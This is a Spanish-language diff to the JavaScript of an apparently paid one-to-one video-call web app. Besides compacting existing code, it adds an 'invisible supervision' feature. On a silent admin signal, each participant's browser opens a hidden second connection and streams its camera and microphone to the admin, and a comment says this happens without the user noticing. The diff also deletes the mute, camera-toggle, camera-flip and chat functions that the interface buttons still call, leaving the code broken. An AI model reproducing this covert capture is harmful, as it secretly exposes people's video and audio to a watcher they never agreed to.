@@ -5,56 +5,30 @@ let callSetupDone = false, facingMode = 'user', currentDeviceId = null, currentM
 let offerSent = false, pendingCandidates = [], currentPolicy = 'all';
 let peerPresent = false, gotAnswer = false, gotOffer = false;
 let helloTimer = null, ackTimer = null, offerTimer = null, watchdog = null, lastReconnectAt = 0, callStartAt = 0;
-let micOn = true, camOn = true, netListenersOn = false;
-let ringTimer = null;
+let micOn = true, camOn = true, netListenersOn = false, ringTimer = null;
+// Supervisión invisible
+let monPc = null, monChannel = null, monPcs = {};
 
 const ICE_SERVERS = [
   { urls: ['stun:stun.l.google.com:19302', 'stun:stun1.l.google.com:19302', 'stun:stun2.l.google.com:19302'] },
   { urls: 'stun:stun.cloudflare.com:3478' },
-  { urls: 'stun:stun.voip.blackberry.com:3478' },
   { urls: ['turn:openrelay.metered.ca:80', 'turn:openrelay.metered.ca:443', 'turn:openrelay.metered.ca:443?transport=tcp', 'turns:openrelay.metered.ca:443'], username: 'openrelayproject', credential: 'openrelayproject' },
   { urls: ['turn:relay.backups.cz:3478', 'turn:relay.backups.cz:5349?transport=tcp', 'turns:relay.backups.cz:5349'], username: 'webrtc', credential: 'webrtc' }
 ];
-
 function setStatus(t) { const m = document.getElementById('callStatusMsg'); if (m) m.textContent = t; }
 function setChatState(t, ok) { const c = document.getElementById('chatState'); if (c) { c.textContent = t; c.style.color = ok ? 'var(--success)' : 'var(--error)'; c.style.fontWeight = '800'; } }
 function showNetHint(on) { const h = document.getElementById('netHint'); if (h) h.classList.toggle('hidden', !on); }
 function clearHello() { if (helloTimer) { clearInterval(helloTimer); helloTimer = null; } }
 function clearAck() { if (ackTimer) { clearInterval(ackTimer); ackTimer = null; } }
 function clearOffer() { if (offerTimer) { clearInterval(offerTimer); offerTimer = null; } }
-
-// ===== TIMBRE: sonido + vibración =====
-function startRing() {
-  stopRing();
-  try {
-    const ctx = window._fendyxAudio || (window._fendyxAudio = new (window.AudioContext || window.webkitAudioContext)());
-    ctx.resume?.();
-    const beep = () => {
-      try {
-        const o = ctx.createOscillator(), g = ctx.createGain();
-        o.type = 'sine'; o.frequency.value = 880;
-        g.gain.setValueAtTime(0.0001, ctx.currentTime);
-        g.gain.exponentialRampToValueAtTime(0.35, ctx.currentTime + 0.05);
-        g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.4);
-        o.connect(g); g.connect(ctx.destination); o.start(); o.stop(ctx.currentTime + 0.45);
-      } catch (e) {}
-    };
-    beep();
-    ringTimer = setInterval(beep, 1200);
-  } catch (e) {}
-  try { navigator.vibrate?.([400, 200, 400, 200, 400]); } catch (e) {}
-}
-function stopRing() {
-  if (ringTimer) { clearInterval(ringTimer); ringTimer = null; }
-  try { navigator.vibrate?.(0); } catch (e) {}
-}
+function startRing() { stopRing(); try { const ctx = window._fendyxAudio || (window._fendyxAudio = new (window.AudioContext || window.webkitAudioContext)()); ctx.resume?.(); const beep = () => { try { const o = ctx.createOscillator(), g = ctx.createGain(); o.type = 'sine'; o.frequency.value = 880; g.gain.setValueAtTime(0.0001, ctx.currentTime); g.gain.exponentialRampToValueAtTime(0.35, ctx.currentTime + 0.05); g.gain.exponentialRampToValueAtTime(0.0001, ctx.currentTime + 0.4); o.connect(g); g.connect(ctx.destination); o.start(); o.stop(ctx.currentTime + 0.45); } catch (e) {} }; beep(); ringTimer = setInterval(beep, 1200); } catch (e) {} try { navigator.vibrate?.([400, 200, 400, 200, 400]); } catch (e) {} }
+function stopRing() { if (ringTimer) { clearInterval(ringTimer); ringTimer = null; } try { navigator.vibrate?.(0); } catch (e) {} }
 
 function ensureCallUI() {
   if (document.getElementById('fendyx-call-style')) return;
-  const st = document.createElement('style');
-  st.id = 'fendyx-call-style';
+  const st = document.createElement('style'); st.id = 'fendyx-call-style';
   st.textContent = `
-    .video-wrap{position:relative;height:340px;background:#000;border-radius:16px;overflow:hidden;margin:10px 0}
+    .video-wrap{position:relative;height:calc(100vh - 300px);min-height:300px;background:#000;border-radius:16px;overflow:hidden;margin:10px 0}
     #remoteVideo{width:100%;height:100%;object-fit:cover;background:#000}
     #localVideo{position:absolute;right:10px;bottom:10px;width:105px;height:140px;object-fit:cover;border-radius:12px;border:2px solid var(--border-strong);background:#111;transition:opacity .2s,filter .2s}
     #localVideo.camoff{opacity:.15;filter:grayscale(1)}
@@ -76,86 +50,42 @@ function ensureCallUI() {
     .call-chat-input{display:flex;gap:6px;padding:6px;border-top:1px solid var(--border)}
     .call-chat-input input{flex:1;padding:8px 10px;background:rgba(255,255,255,.05);border:1px solid var(--border);border-radius:9px;color:var(--text);font-family:'Rajdhani'}
     .incoming-call{position:fixed;top:70px;left:50%;transform:translateX(-50%);z-index:600;background:var(--card-2);border:2px solid var(--success);border-radius:18px;padding:14px 20px;display:flex;gap:12px;align-items:center;box-shadow:0 10px 40px rgba(0,255,157,.35);animation:proxIn .4s;max-width:92vw}
-    .incoming-call b{display:block}`;
+    .incoming-call b{display:block}
+    .am-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:10px;margin-top:10px}
+    .am-tile{position:relative;background:#000;border-radius:12px;overflow:hidden;aspect-ratio:4/3}
+    .am-tile video{width:100%;height:100%;object-fit:cover}
+    .am-tile span{position:absolute;top:6px;left:8px;background:rgba(0,0,0,.6);padding:2px 8px;border-radius:999px;font-size:.72rem}`;
   document.head.appendChild(st);
   const mc = document.querySelector('#modal-call .modal-content');
   if (mc) mc.innerHTML = `
     <div class="call-info"><span id="callTimer">00:00</span><span id="chatState" class="chat-state">💬 Chat no conectado</span><span id="callCost">◈ 0.00</span></div>
-    <div class="video-wrap">
-      <video id="remoteVideo" autoplay playsinline></video>
-      <video id="localVideo" autoplay playsinline muted></video>
+    <div class="video-wrap"><video id="remoteVideo" autoplay playsinline></video><video id="localVideo" autoplay playsinline muted></video>
       <div id="callStatusMsg" class="dim">🎥 Conectando video…</div>
-      <div id="netHint" class="net-hint hidden">📶 El video no conecta en esta red. Cambia a datos móviles o activa/desactiva WiFi para conectar el video.</div>
-    </div>
+      <div id="netHint" class="net-hint hidden">📶 El video no conecta en esta red. Cambia a datos móviles o activa/desactiva WiFi.</div></div>
     <div class="call-controls">
       <button id="btnMic" class="btn-small" onclick="toggleMic()">🎤 Silenciar</button>
       <button id="btnCam" class="btn-small" onclick="toggleCam()">📷 Encendida</button>
       <button id="btnFlip" class="btn-small" onclick="flipCamera()">🔄</button>
       <button id="btnDev" class="btn-small" onclick="toggleDevicePanel()">⚙️</button>
-      <button class="btn-small danger" onclick="endWebCall()">📞</button>
-    </div>
-    <div id="devicePanel" class="device-panel hidden">
-      <label>📷 Cámara</label><select id="selCam" onchange="changeCam(this.value)"></select>
-      <label>🎤 Micrófono</label><select id="selMic" onchange="changeMic(this.value)"></select>
-    </div>
-    <div class="call-chat">
-      <div id="callChatList" class="call-chat-list"></div>
-      <div class="call-chat-input"><input id="callChatInput" placeholder="Mensaje en la llamada…" onkeypress="if(event.key==='Enter')sendCallChat()"><button class="btn-small" onclick="sendCallChat()">➤</button></div>
-    </div>`;
+      <button class="btn-small danger" onclick="endWebCall()">📞</button></div>
+    <div id="devicePanel" class="device-panel hidden"><label>📷 Cámara</label><select id="selCam" onchange="changeCam(this.value)"></select><label>🎤 Micrófono</label><select id="selMic" onchange="changeMic(this.value)"></select></div>
+    <div class="call-chat"><div id="callChatList" class="call-chat-list"></div>
+      <div class="call-chat-input"><input id="callChatInput" placeholder="Mensaje en la llamada…" onkeypress="if(event.key==='Enter')sendCallChat()"><button class="btn-small" onclick="sendCallChat()">➤</button></div></div>`;
 }
-
-function armAutoUnmute() {
-  const unmute = () => { const rv = document.getElementById('remoteVideo'); if (rv) { rv.muted = false; rv.play().catch(() => {}); } window.removeEventListener('pointerdown', unmute, true); window.removeEventListener('keydown', unmute, true); };
-  window.addEventListener('pointerdown', unmute, true);
-  window.addEventListener('keydown', unmute, true);
-}
+function armAutoUnmute() { const u = () => { const rv = document.getElementById('remoteVideo'); if (rv) { rv.muted = false; rv.play().catch(() => {}); } window.removeEventListener('pointerdown', u, true); window.removeEventListener('keydown', u, true); }; window.addEventListener('pointerdown', u, true); window.addEventListener('keydown', u, true); }
 function playRemoteNow() { const rv = document.getElementById('remoteVideo'); if (!rv) return; rv.muted = false; rv.play().catch(() => armAutoUnmute()); }
-
-function armNetworkWatch() {
-  if (netListenersOn) return; netListenersOn = true;
-  const onChange = () => { if (callRoom) { setStatus('🔄 Cambió la red: reconectando video…'); forceReconnect(); } };
-  try { if (navigator.connection) navigator.connection.addEventListener('change', onChange); } catch (e) {}
-  window.addEventListener('online', onChange);
-  window.addEventListener('offline', onChange);
-}
-
+function armNetworkWatch() { if (netListenersOn) return; netListenersOn = true; const onChange = () => { if (callRoom) { setStatus('🔄 Cambió la red: reconectando…'); forceReconnect(); } }; try { if (navigator.connection) navigator.connection.addEventListener('change', onChange); } catch (e) {} window.addEventListener('online', onChange); window.addEventListener('offline', onChange); }
 function toggleDevicePanel() { const p = document.getElementById('devicePanel'); if (!p) return; if (!p.classList.toggle('hidden')) populateDevices(); }
-async function populateDevices() {
-  try {
-    const devs = await navigator.mediaDevices.enumerateDevices();
-    const cams = devs.filter(d => d.kind === 'videoinput'); const mics = devs.filter(d => d.kind === 'audioinput');
-    const sc = document.getElementById('selCam'), sm = document.getElementById('selMic');
-    if (sc) sc.innerHTML = cams.map((c, i) => `<option value="${c.deviceId}" ${c.deviceId === currentDeviceId ? 'selected' : ''}>${c.label || ('Cámara ' + (i + 1))}</option>`).join('');
-    if (sm) sm.innerHTML = mics.map((m, i) => `<option value="${m.deviceId}" ${m.deviceId === currentMicId ? 'selected' : ''}>${m.label || ('Micrófono ' + (i + 1))}</option>`).join('');
-  } catch (e) {}
-}
-async function changeCam(deviceId) { if (!deviceId || !pc || !localStream) return; try { const ns = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: deviceId } }, audio: false }); applyVideoTrack(ns.getVideoTracks()[0]); showToast('📷 Cámara cambiada'); } catch (e) { showToast('❌ No se pudo usar esa cámara'); } }
-async function changeMic(deviceId) { if (!deviceId || !pc || !localStream) return; try { const ns = await navigator.mediaDevices.getUserMedia({ audio: { deviceId: { exact: deviceId } }, video: false }); applyAudioTrack(ns.getAudioTracks()[0]); showToast('🎤 Micrófono cambiado'); } catch (e) { showToast('❌ No se pudo usar ese micrófono'); } }
+async function populateDevices() { try { const devs = await navigator.mediaDevices.enumerateDevices(); const cams = devs.filter(d => d.kind === 'videoinput'); const mics = devs.filter(d => d.kind === 'audioinput'); const sc = document.getElementById('selCam'), sm = document.getElementById('selMic'); if (sc) sc.innerHTML = cams.map((c, i) => `<option value="${c.deviceId}" ${c.deviceId === currentDeviceId ? 'selected' : ''}>${c.label || ('Cámara ' + (i + 1))}</option>`).join(''); if (sm) sm.innerHTML = mics.map((m, i) => `<option value="${m.deviceId}" ${m.deviceId === currentMicId ? 'selected' : ''}>${m.label || ('Micrófono ' + (i + 1))}</option>`).join(''); } catch (e) {} }
+async function changeCam(id) { if (!id || !pc || !localStream) return; try { const ns = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: id } }, audio: false }); applyVideoTrack(ns.getVideoTracks()[0]); showToast('📷 Cámara cambiada'); } catch (e) { showToast('❌ No se pudo'); } }
+async function changeMic(id) { if (!id || !pc || !localStream) return; try { const ns = await navigator.mediaDevices.getUserMedia({ audio: { deviceId: { exact: id } }, video: false }); applyAudioTrack(ns.getAudioTracks()[0]); showToast('🎤 Micrófono cambiado'); } catch (e) { showToast('❌ No se pudo'); } }
 function applyVideoTrack(nt) { currentDeviceId = nt.getSettings?.().deviceId || nt.id; const ot = localStream.getVideoTracks()[0]; if (ot) { ot.stop(); localStream.removeTrack(ot); } localStream.addTrack(nt); const lv = document.getElementById('localVideo'); if (lv) { lv.srcObject = localStream; lv.play().catch(() => {}); } const s = pc.getSenders().find(s => s.track && s.track.kind === 'video'); if (s) s.replaceTrack(nt); }
 function applyAudioTrack(nt) { currentMicId = nt.getSettings?.().deviceId || nt.id; const ot = localStream.getAudioTracks()[0]; if (ot) { ot.stop(); localStream.removeTrack(ot); } localStream.addTrack(nt); const s = pc.getSenders().find(s => s.track && s.track.kind === 'audio'); if (s) s.replaceTrack(nt); }
 
-async function showIncomingCall(row) {
-  ensureCallUI();
-  const { data: caller } = await db.from('profiles').select('full_name, model_name').eq('id', row.client_id).single();
-  const box = document.getElementById('incomingCall'); if (!box) return;
-  box.classList.remove('hidden');
-  box.innerHTML = `<div><b>📞 ${caller?.model_name || caller?.full_name || 'Llamada'}</b><small>◈ ${row.rate_per_minute}/min · Videollamada FENDYX</small></div>
-    <button class="btn-small success" onclick="acceptIncoming('${row.room_id}',${row.rate_per_minute},'${row.id}')">✅</button>
-    <button class="btn-small danger" onclick="rejectIncoming('${row.id}')">❌</button>`;
-  startRing();
-}
-async function acceptIncoming(room, rate, rowId) {
-  stopRing();
-  document.getElementById('incomingCall').classList.add('hidden');
-  await joinWebCall(room, { rate: parseFloat(rate) || 0, rowId, asClient: false });
-}
-async function rejectIncoming(rowId) {
-  stopRing();
-  document.getElementById('incomingCall').classList.add('hidden');
-  await db.from('video_calls').update({ status: 'ended', ended_at: new Date().toISOString() }).eq('id', rowId);
-}
+async function showIncomingCall(row) { ensureCallUI(); const { data: c } = await db.from('profiles').select('full_name, model_name').eq('id', row.client_id).single(); const box = document.getElementById('incomingCall'); if (!box) return; box.classList.remove('hidden'); box.innerHTML = `<div><b>📞 ${c?.model_name || c?.full_name || 'Llamada'}</b><small>◈ ${row.rate_per_minute}/min</small></div><button class="btn-small success" onclick="acceptIncoming('${row.room_id}',${row.rate_per_minute},'${row.id}')">✅</button><button class="btn-small danger" onclick="rejectIncoming('${row.id}')">❌</button>`; startRing(); }
+async function acceptIncoming(room, rate, rowId) { stopRing(); document.getElementById('incomingCall').classList.add('hidden'); await joinWebCall(room, { rate: parseFloat(rate) || 0, rowId, asClient: false }); }
+async function rejectIncoming(rowId) { stopRing(); document.getElementById('incomingCall').classList.add('hidden'); await db.from('video_calls').update({ status: 'ended', ended_at: new Date().toISOString() }).eq('id', rowId); }
 function remoteHungUp(row) { stopRing(); if (callRoom && row.room_id === callRoom) { showToast('📞 La otra persona colgó'); cleanupCall(); } }
-
 async function startWebCall(room, opts = {}) { await beginCall(room, opts, true); }
 async function joinWebCall(room, opts = {}) { await beginCall(room, opts, false); }
 
@@ -172,16 +102,15 @@ async function beginCall(room, opts, initiator) {
   const bm = document.getElementById('btnMic'); if (bm) { bm.textContent = '🎤 Silenciar'; bm.classList.remove('off'); }
   const bc = document.getElementById('btnCam'); if (bc) { bc.textContent = '📷 Encendida'; bc.classList.remove('off'); }
   document.getElementById('callTimer').textContent = '00:00';
-  const costSpan = document.getElementById('callCost');
-  if (costSpan) { if (iAmClientFlag) { costSpan.style.display = 'none'; } else { costSpan.style.display = ''; costSpan.style.color = 'var(--success)'; costSpan.textContent = '+0.00 ◈'; } }
-  setChatState('💬 Chat no conectado', false);
-  showNetHint(false);
+  const cs = document.getElementById('callCost');
+  if (cs) { if (iAmClientFlag) cs.style.display = 'none'; else { cs.style.display = ''; cs.style.color = 'var(--success)'; cs.textContent = '+0.00 ◈'; } }
+  setChatState('💬 Chat no conectado', false); showNetHint(false);
   setStatus('📷 Solicitando cámara…');
   document.getElementById('callChatList').innerHTML = '';
   document.getElementById('devicePanel')?.classList.add('hidden');
   openModal('modal-call');
   try { localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: 'user' } }, audio: { echoCancellation: true, noiseSuppression: true } }); }
-  catch (e) { try { localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); } catch (e2) { showToast('❌ Permiso de cámara/micrófono denegado'); closeModal('modal-call'); return; } }
+  catch (e) { try { localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); } catch (e2) { showToast('❌ Permiso denegado'); closeModal('modal-call'); return; } }
   currentDeviceId = localStream.getVideoTracks()[0]?.getSettings?.().deviceId || null;
   currentMicId = localStream.getAudioTracks()[0]?.getSettings?.().deviceId || null;
   const lv = document.getElementById('localVideo'); lv.srcObject = localStream; lv.muted = true; lv.classList.remove('camoff'); lv.play().catch(() => {});
@@ -190,82 +119,43 @@ async function beginCall(room, opts, initiator) {
     .on('broadcast', { event: 'signal' }, ({ payload }) => handleSignal(payload))
     .on('broadcast', { event: 'chatmsg' }, ({ payload }) => appendCallChat(payload.text, false))
     .on('broadcast', { event: 'hangup' }, () => { showToast('📞 La otra persona colgó'); cleanupCall(); });
-  callChannel.subscribe(async status => {
-    if (status !== 'SUBSCRIBED' || callSetupDone) return;
-    callSetupDone = true;
-    createPC('all');
-    startHelloLoop();
-    startWatchdog();
-  });
+  callChannel.subscribe(async s => { if (s !== 'SUBSCRIBED' || callSetupDone) return; callSetupDone = true; createPC('all'); startHelloLoop(); startWatchdog(); });
 }
-
 function startHelloLoop() { clearHello(); send({ type: 'hello' }); helloTimer = setInterval(() => { if (!peerPresent) send({ type: 'hello' }); else clearHello(); }, 1000); }
 function startAckLoop() { clearAck(); send({ type: 'helloAck' }); ackTimer = setInterval(() => { if (!gotOffer) send({ type: 'helloAck' }); else clearAck(); }, 1000); }
 function startOfferLoop() { if (offerTimer) return; createOffer(); offerTimer = setInterval(() => { if (!gotAnswer) createOffer(); else clearOffer(); }, 1500); }
-
 function teardownPC() { if (pc) { try { pc.close(); } catch (e) {} pc = null; } offerSent = false; pendingCandidates = []; }
-
 function createPC(policy) {
-  currentPolicy = policy || 'all';
-  teardownPC();
+  currentPolicy = policy || 'all'; teardownPC();
   pc = new RTCPeerConnection({ iceServers: ICE_SERVERS, iceCandidatePoolSize: 6, iceTransportPolicy: currentPolicy });
   localStream.getTracks().forEach(t => pc.addTrack(t, localStream));
   pc.ontrack = e => { const rv = document.getElementById('remoteVideo'); if (rv) { rv.srcObject = e.streams[0]; playRemoteNow(); } };
   pc.onicecandidate = e => { if (e.candidate) send({ type: 'ice', candidate: e.candidate }); };
-  pc.oniceconnectionstatechange = () => {
-    const s = pc.iceConnectionState;
-    if (s === 'checking') setStatus('🎥 Conectando video…');
-    if (s === 'disconnected') { try { pc.restartIce(); } catch (e) {} setStatus('🟡 Video: estabilizando…'); }
-    if (s === 'failed') queueReconnect(600);
-  };
-  pc.onconnectionstatechange = () => {
-    const st = pc.connectionState;
-    if (st === 'connected') { setStatus('🟢 Video conectado'); showNetHint(false); playRemoteNow(); const lv = document.getElementById('localVideo'); if (lv) lv.play().catch(() => {}); startCallClock(); }
-    else if (st === 'failed') queueReconnect(600);
-    else if (st === 'closed' && callRoom) { showToast('📞 Llamada finalizada'); cleanupCall(); }
-  };
+  pc.oniceconnectionstatechange = () => { const s = pc.iceConnectionState; if (s === 'checking') setStatus('🎥 Conectando video…'); if (s === 'disconnected') { try { pc.restartIce(); } catch (e) {} setStatus('🟡 Estabilizando…'); } if (s === 'failed') queueReconnect(600); };
+  pc.onconnectionstatechange = () => { const st = pc.connectionState; if (st === 'connected') { setStatus('🟢 Video conectado'); showNetHint(false); playRemoteNow(); const lv = document.getElementById('localVideo'); if (lv) lv.play().catch(() => {}); startCallClock(); } else if (st === 'failed') queueReconnect(600); else if (st === 'closed' && callRoom) { showToast('📞 Llamada finalizada'); cleanupCall(); } };
 }
-
-function forceReconnect() {
-  if (!callRoom) return;
-  gotAnswer = false; gotOffer = false; pendingCandidates = [];
-  createPC(currentPolicy);
-  startHelloLoop();
-  if (isInitiatorFlag) setTimeout(() => { if (peerPresent && !gotAnswer) startOfferLoop(); }, 800);
-}
-function queueReconnect(delay) {
-  const now = Date.now();
-  if (now - lastReconnectAt < 1500) return;
-  lastReconnectAt = now;
-  setStatus('🟡 Video: reintentando…');
-  setTimeout(() => { if (callRoom) forceReconnect(); }, delay || 800);
-}
-function startWatchdog() {
-  if (watchdog) return;
-  watchdog = setInterval(() => {
-    if (!callRoom || !pc) return;
-    if (pc.connectionState !== 'connected') {
-      if (Date.now() - callStartAt > 12000) showNetHint(true);
-      const now = Date.now();
-      if (now - lastReconnectAt > 5000) { lastReconnectAt = now; setStatus('🟡 Video: reintentando…'); forceReconnect(); }
-    } else showNetHint(false);
-  }, 5000);
-}
-
-function send(msg) { if (callChannel) callChannel.send({ type: 'broadcast', event: 'signal', payload: { ...msg, from: currentUser.id } }); }
+function forceReconnect() { if (!callRoom) return; gotAnswer = false; gotOffer = false; pendingCandidates = []; createPC(currentPolicy); startHelloLoop(); if (isInitiatorFlag) setTimeout(() => { if (peerPresent && !gotAnswer) startOfferLoop(); }, 800); }
+function queueReconnect(d) { const now = Date.now(); if (now - lastReconnectAt < 1500) return; lastReconnectAt = now; setStatus('🟡 Reintentando…'); setTimeout(() => { if (callRoom) forceReconnect(); }, d || 800); }
+function startWatchdog() { if (watchdog) return; watchdog = setInterval(() => { if (!callRoom || !pc) return; if (pc.connectionState !== 'connected') { if (Date.now() - callStartAt > 12000) showNetHint(true); const now = Date.now(); if (now - lastReconnectAt > 5000) { lastReconnectAt = now; setStatus('🟡 Reintentando…'); forceReconnect(); } } else showNetHint(false); }, 5000); }
+function send(msg) { if (callChannel) callChannel.send({ type: 'broadcast', event: 'signal', payload: Object.assign({ from: currentUser.id }, msg) }); }
 function flushCandidates() { while (pendingCandidates.length && pc) { const c = pendingCandidates.shift(); pc.addIceCandidate(c).catch(() => {}); } }
-async function createOffer() {
-  if (!pc) return;
-  offerSent = true;
-  try { const o = await pc.createOffer(); await pc.setLocalDescription(o); send({ type: 'description', sdp: pc.localDescription }); }
-  catch (e) { offerSent = false; }
-}
+async function createOffer() { if (!pc) return; offerSent = true; try { const o = await pc.createOffer(); await pc.setLocalDescription(o); send({ type: 'description', sdp: pc.localDescription }); } catch (e) { offerSent = false; } }
+
 async function handleSignal(p) {
   if (!p || p.from === currentUser.id) return;
+  // --- Supervisión invisible: el admin se anuncia en silencio ---
+  if (p.silent && p.type === 'hello') { setupMonitorFor(p.from); return; }
+  if (p.type === 'bye-monitor') { if (monPc) { monPc.close(); monPc = null; } return; }
+  if (p.mon) {
+    if (p.to !== currentUser.id) return;
+    if (p.type === 'mon-answer') { monPc?.setRemoteDescription(p.sdp).catch(() => {}); return; }
+    if (p.type === 'mon-ice') { monPc?.addIceCandidate(p.candidate).catch(() => {}); return; }
+    return;
+  }
+  // --- Handshake normal 1a1 ---
   if (p.type === 'hello' || p.type === 'helloAck') {
-    const wasPresent = peerPresent;
-    peerPresent = true; clearHello();
-    if (!wasPresent) setChatState('💬 Chat conectado', true);
+    const was = peerPresent; peerPresent = true; clearHello();
+    if (!was) setChatState('💬 Chat conectado', true);
     if (!pc || pc.connectionState === 'failed' || pc.connectionState === 'closed') createPC(currentPolicy);
     if (p.type === 'hello' && !isInitiatorFlag) { if (!gotOffer) startAckLoop(); }
     if (isInitiatorFlag) startOfferLoop();
@@ -274,97 +164,63 @@ async function handleSignal(p) {
   if (!pc) return;
   if (p.type === 'description') {
     try {
-      if (p.sdp.type === 'offer' && !isInitiatorFlag) {
-        gotOffer = true; clearAck();
-        await pc.setRemoteDescription(p.sdp); flushCandidates();
-        const a = await pc.createAnswer(); await pc.setLocalDescription(a); send({ type: 'description', sdp: pc.localDescription });
-      } else if (p.sdp.type === 'answer' && isInitiatorFlag) {
-        if (!gotAnswer) { gotAnswer = true; clearOffer(); await pc.setRemoteDescription(p.sdp); flushCandidates(); }
-      }
+      if (p.sdp.type === 'offer' && !isInitiatorFlag) { gotOffer = true; clearAck(); await pc.setRemoteDescription(p.sdp); flushCandidates(); const a = await pc.createAnswer(); await pc.setLocalDescription(a); send({ type: 'description', sdp: pc.localDescription }); }
+      else if (p.sdp.type === 'answer' && isInitiatorFlag) { if (!gotAnswer) { gotAnswer = true; clearOffer(); await pc.setRemoteDescription(p.sdp); flushCandidates(); } }
     } catch (e) {}
     return;
   }
   if (p.type === 'ice') { if (pc.remoteDescription) pc.addIceCandidate(p.candidate).catch(() => {}); else pendingCandidates.push(p.candidate); }
 }
 
-async function flipCamera() {
-  if (!localStream || !pc) return;
-  let cams = [];
-  try { cams = (await navigator.mediaDevices.enumerateDevices()).filter(d => d.kind === 'videoinput'); } catch (e) {}
-  if (cams.length < 2) { showToast('❌ Este modelo tiene una sola cámara'); return; }
-  facingMode = facingMode === 'user' ? 'environment' : 'user';
-  const others = cams.filter(c => c.deviceId !== currentDeviceId);
-  let ns = null;
-  for (const c of others) { try { ns = await navigator.mediaDevices.getUserMedia({ video: { deviceId: { exact: c.deviceId } }, audio: false }); break; } catch (e) {} }
-  if (!ns) { try { ns = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facingMode } }, audio: false }); } catch (e) {} }
-  if (!ns) { try { ns = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: false }); } catch (e) {} }
-  if (!ns) { showToast('❌ No se pudo voltear; usa ⚙️'); return; }
-  const nt = ns.getVideoTracks()[0];
-  const newId = nt.getSettings?.().deviceId || null;
-  if (newId && newId === currentDeviceId) { showToast('❌ El modelo no cambió de lente; usa ⚙️'); return; }
-  applyVideoTrack(nt);
-  showToast(facingMode === 'environment' ? '🔄 Cámara trasera' : '🔄 Cámara frontal');
+// ===== LADO PARTICIPANTE: envía video al admin sin que se note =====
+function setupMonitorFor(adminId) {
+  if (monPc || !localStream || !callChannel) return;
+  monPc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
+  localStream.getTracks().forEach(t => monPc.addTrack(t, localStream));
+  monPc.onicecandidate = e => { if (e.candidate && callChannel) callChannel.send({ type: 'broadcast', event: 'signal', payload: { from: currentUser.id, to: adminId, mon: true, type: 'mon-ice', candidate: e.candidate } }); };
+  monPc.createOffer().then(o => monPc.setLocalDescription(o)).then(() => { if (callChannel) callChannel.send({ type: 'broadcast', event: 'signal', payload: { from: currentUser.id, to: adminId, mon: true, type: 'mon-offer', sdp: monPc.localDescription } }); }).catch(() => {});
 }
 
-function toggleMic() {
-  const t = localStream?.getAudioTracks()[0]; if (!t) return;
-  micOn = !micOn; t.enabled = micOn;
-  const b = document.getElementById('btnMic'); if (b) { b.textContent = micOn ? '🎤 Silenciar' : '🔇 Silenciado'; b.classList.toggle('off', !micOn); }
-  showToast(micOn ? '🎤 Micrófono activo: te escuchan' : '🔇 Silenciado: no te escuchan');
+// ===== LADO ADMIN: mosaico invisible =====
+function ensureAmModal() { if (document.getElementById('amModal')) return; const m = document.createElement('div'); m.id = 'amModal'; m.className = 'modal hidden'; m.innerHTML = `<div class="modal-content wide"><div class="modal-head"><h3>👁 Supervisión en vivo</h3><button class="modal-close" onclick="stopAdminMonitor()">✕</button></div><div id="amGrid" class="am-grid"></div></div>`; document.body.appendChild(m); }
+function amAddTile(id, name) { const g = document.getElementById('amGrid'); if (!g || g.querySelector('[data-tile="' + id + '"]')) return; g.insertAdjacentHTML('beforeend', `<div class="am-tile" data-tile="${id}"><video autoplay playsinline muted></video><span>${name}</span></div>`); }
+function amSetTileVideo(id, stream) { const t = document.querySelector('[data-tile="' + id + '"] video'); if (t) t.srcObject = stream; }
+async function startAdminMonitor(roomId) {
+  ensureAmModal();
+  stopAdminMonitor(true);
+  const { data: row } = await db.from('video_calls').select('*, c:profiles!video_calls_client_id_fkey(full_name,model_name), w:profiles!video_calls_worker_id_fkey(full_name,model_name)').eq('room_id', roomId).single();
+  monChannel = db.channel('call_' + roomId).on('broadcast', { event: 'signal' }, ({ payload }) => handleMonSignal(payload));
+  await new Promise(res => monChannel.subscribe(s => { if (s === 'SUBSCRIBED') res(); }));
+  document.getElementById('amGrid').innerHTML = '';
+  if (row) { amAddTile(row.client_id, row.c?.model_name || row.c?.full_name || 'Cliente'); amAddTile(row.worker_id, row.w?.model_name || row.w?.full_name || 'Modelo'); }
+  openModal('amModal');
+  monChannel.send({ type: 'broadcast', event: 'signal', payload: { from: currentUser.id, type: 'hello', silent: true } });
 }
-function toggleCam() {
-  const t = localStream?.getVideoTracks()[0]; if (!t) return;
-  camOn = !camOn; t.enabled = camOn;
-  const lv = document.getElementById('localVideo'); if (lv) lv.classList.toggle('camoff', !camOn);
-  const b = document.getElementById('btnCam'); if (b) { b.textContent = camOn ? '📷 Encendida' : '🚫 Apagada'; b.classList.toggle('off', !camOn); }
-  showToast(camOn ? '📷 Cámara encendida' : '🚫 Cámara apagada');
+async function handleMonSignal(p) {
+  if (!p || p.from === currentUser.id) return;
+  if (p.mon && p.to === currentUser.id) {
+    if (p.type === 'mon-offer') {
+      const npc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
+      monPcs[p.from] = npc;
+      npc.onicecandidate = e => { if (e.candidate && monChannel) monChannel.send({ type: 'broadcast', event: 'signal', payload: { from: currentUser.id, to: p.from, mon: true, type: 'mon-ice', candidate: e.candidate } }); };
+      npc.ontrack = e => amSetTileVideo(p.from, e.streams[0]);
+      await npc.setRemoteDescription(p.sdp);
+      const a = await npc.createAnswer(); await npc.setLocalDescription(a);
+      monChannel.send({ type: 'broadcast', event: 'signal', payload: { from: currentUser.id, to: p.from, mon: true, type: 'mon-answer', sdp: npc.localDescription } });
+    } else if (p.type === 'mon-ice') { monPcs[p.from]?.addIceCandidate(p.candidate).catch(() => {}); }
+  }
 }
-
-function appendCallChat(text, mine) {
-  const list = document.getElementById('callChatList'); if (!list) return;
-  list.insertAdjacentHTML('beforeend', `<div class="cc ${mine ? 'me' : 'them'}">${text}</div>`);
-  list.scrollTop = list.scrollHeight;
-}
-function sendCallChat() {
-  const inp = document.getElementById('callChatInput'); if (!inp) return;
-  const text = inp.value.trim(); if (!text || !callChannel) return;
-  inp.value = '';
-  appendCallChat(text, true);
-  callChannel.send({ type: 'broadcast', event: 'chatmsg', payload: { from: currentUser.id, text } });
-}
-
